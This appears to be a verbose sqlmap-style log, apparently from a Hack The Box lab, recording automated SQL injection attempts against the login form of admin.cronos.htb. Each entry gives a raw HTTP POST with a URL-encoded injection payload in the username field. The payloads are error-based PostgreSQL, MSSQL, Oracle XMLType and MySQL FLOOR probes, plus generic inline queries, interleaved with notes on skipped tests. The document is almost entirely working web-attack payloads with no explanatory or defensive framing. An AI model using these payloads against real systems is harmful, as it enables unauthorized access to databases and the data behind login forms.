+[18:32:22] [TRAFFIC OUT] HTTP request [#18]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 381
+Connection: close
+
+username=user%27%20AND%207592%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287592%3D7592%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27eCBp%27%3D%27eCBp&password=bla
+
+[18:32:22] [PAYLOAD] user) AND 7592=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7592=7592) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC) AND (5002=5002
+[18:32:22] [TRAFFIC OUT] HTTP request [#19]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 375
+Connection: close
+
+username=user%29%20AND%207592%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287592%3D7592%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285002%3D5002&password=bla
+
+[18:32:22] [PAYLOAD] user AND 7592=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7592=7592) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)
+[18:32:22] [TRAFFIC OUT] HTTP request [#20]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 349
+Connection: close
+
+username=user%20AND%207592%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287592%3D7592%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&password=bla
+
+[18:32:22] [PAYLOAD] user AND 7592=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7592=7592) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- vZuZ
+[18:32:22] [TRAFFIC OUT] HTTP request [#21]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 358
+Connection: close
+
+username=user%20AND%207592%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287592%3D7592%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20vZuZ&password=bla
+
+[18:32:22] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[18:32:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[18:32:22] [PAYLOAD] user') AND 4289 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4289=4289) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(113))) AND ('jkAZ'='jkAZ
+[18:32:22] [TRAFFIC OUT] HTTP request [#22]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 368
+Connection: close
+
+username=user%27%29%20AND%204289%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284289%3D4289%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%28%27jkAZ%27%3D%27jkAZ&password=bla
+
+[18:32:23] [PAYLOAD] user' AND 4289 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4289=4289) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(113))) AND 'GeVm'='GeVm
+[18:32:23] [TRAFFIC OUT] HTTP request [#23]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 362
+Connection: close
+
+username=user%27%20AND%204289%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284289%3D4289%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27GeVm%27%3D%27GeVm&password=bla
+
+[18:32:23] [PAYLOAD] user) AND 4289 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4289=4289) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(113))) AND (6066=6066
+[18:32:23] [TRAFFIC OUT] HTTP request [#24]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 356
+Connection: close
+
+username=user%29%20AND%204289%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284289%3D4289%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%286066%3D6066&password=bla
+
+[18:32:23] [PAYLOAD] user AND 4289 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4289=4289) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(113)))
+[18:32:23] [TRAFFIC OUT] HTTP request [#25]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 330
+Connection: close
+
+username=user%20AND%204289%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284289%3D4289%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29&password=bla
+
+[18:32:23] [PAYLOAD] user AND 4289 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4289=4289) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(113)))-- LrGH
+[18:32:23] [TRAFFIC OUT] HTTP request [#26]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 339
+Connection: close
+
+username=user%20AND%204289%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284289%3D4289%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20LrGH&password=bla
+
+[18:32:23] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the risk (3) is higher than the provided (1)
+[18:32:23] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the level (2) is higher than the provided (1)
+[18:32:23] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the risk (3) is higher than the provided (1)
+[18:32:23] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the level (2) is higher than the provided (1)
+[18:32:23] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the risk (3) is higher than the provided (1)
+[18:32:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[18:32:23] [PAYLOAD] user') AND 8339=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8339=8339) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND ('dRZm'='dRZm
+[18:32:23] [TRAFFIC OUT] HTTP request [#27]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 458
+Connection: close
+
+username=user%27%29%20AND%208339%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288339%3D8339%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27dRZm%27%3D%27dRZm&password=bla
+
+[18:32:23] [PAYLOAD] user' AND 8339=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8339=8339) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND 'hAyJ'='hAyJ
+[18:32:23] [TRAFFIC OUT] HTTP request [#28]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 452
+Connection: close
+
+username=user%27%20AND%208339%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288339%3D8339%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27hAyJ%27%3D%27hAyJ&password=bla
+
+[18:32:23] [PAYLOAD] user) AND 8339=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8339=8339) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND (2057=2057
+[18:32:23] [TRAFFIC OUT] HTTP request [#29]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 446
+Connection: close
+
+username=user%29%20AND%208339%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288339%3D8339%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%282057%3D2057&password=bla
+
+[18:32:24] [PAYLOAD] user AND 8339=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8339=8339) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL)
+[18:32:24] [TRAFFIC OUT] HTTP request [#30]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 420
+Connection: close
+
+username=user%20AND%208339%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288339%3D8339%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&password=bla
+
+[18:32:24] [PAYLOAD] user AND 8339=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8339=8339) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL)-- XpWC
+[18:32:24] [TRAFFIC OUT] HTTP request [#31]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 429
+Connection: close
+
+username=user%20AND%208339%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288339%3D8339%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20XpWC&password=bla
+
+[18:32:24] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the level (5) is higher than the provided (1)
+[18:32:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[18:32:24] [PAYLOAD] (SELECT 4565 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(4565=4565,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+[18:32:24] [TRAFFIC OUT] HTTP request [#32]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 251
+Connection: close
+
+username=%28SELECT%204565%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176766a71%2C%28SELECT%20%28ELT%284565%3D4565%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&password=bla
+
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
+[18:32:24] [INFO] testing 'Generic inline queries'
+[18:32:24] [PAYLOAD] (SELECT CONCAT(CONCAT('qvvjq',(CASE WHEN (2627=2627) THEN '1' ELSE '0' END)),'qqpzq'))
+[18:32:24] [TRAFFIC OUT] HTTP request [#33]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 166
+Connection: close
+
+username=%28SELECT%20CONCAT%28CONCAT%28%27qvvjq%27%2C%28CASE%20WHEN%20%282627%3D2627%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qqpzq%27%29%29&password=bla
+
+[18:32:24] [DEBUG] skipping test 'MySQL inline queries' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'PostgreSQL inline queries' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Oracle inline queries' because the level (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'Firebird inline queries' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because the level (2) is higher than the provided (1)
